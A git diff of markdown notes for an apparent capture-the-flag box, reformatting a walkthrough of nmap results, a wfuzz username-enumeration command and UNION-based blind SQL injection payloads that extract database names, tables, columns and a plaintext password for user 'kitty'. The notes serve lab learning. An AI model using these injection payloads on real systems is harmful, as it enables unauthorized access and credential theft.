@@ -4,6 +4,7 @@
 
 ## nmap
 
+```
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   3072 b0:c5:69:e6:dd:6b:81:0c:da:32:be:41:e3:5b:97:87 (RSA)
@@ -17,33 +18,43 @@
 |_      httponly flag not set
 |_http-title: Login
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
 ## http 80
 
 sqli: user'-- -
 
+```sh
 wfuzz --hh 1147 -c -w /usr/share/wordlists/seclists/Usernames/Names/names.txt  -d "username=FUZZ%27--+-&password=sqdfqsdfsqdfsdf" http://10.10.181.136/index.php
-
+```
 => kitty
 
+### SQLI
+
+```sql
 ' UNION SELECT 1,2,3,4-- -
+```
 
 => 4 columns
 
-### DB
+#### DB
 
+```sql
 ' UNION SELECT 1,2,3,4 FROM information_schema.schemata WHERE schema_name LIKE BINARY "a%"-- -
+```
 
 - bf_databases.py
 
-devsite
-information_schema
-mywebsite
-performance_schema
+    - devsite
+    - information_schema
+    - mywebsite
+    - performance_schema
 
-### TABLES
+#### TABLES
 
+```sql
 ' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = 'mywebsite' AND table_name LIKE BINARY 'u%'-- -
+```
 
 For mywebsite:
 - siteusers
@@ -51,9 +62,11 @@ For mywebsite:
 For devsite:
 - siteusers
 
-### COLUMNS
+#### COLUMNS
 
+```sql
 ' UNION SELECT 1,2,3,4 FROM information_schema.COLUMNS WHERE table_schema = 'mywebsite' AND table_name = 'siteusers' AND COLUMN_NAME LIKE BINARY 'u%'-- -
+```
 
 For mywebsite:
 - created_at
@@ -67,9 +80,11 @@ For devsite:
 - password
 - username
 
-### PASSWORD
+#### PASSWORD
 
+```sql
 ' UNION SELECT 1,2,3,4 FROM siteusers WHERE username = 'kitty' AND password LIKE BINARY '{result}{char}%'-- -
+```
 
 L0ng_Liv3_KittY
 
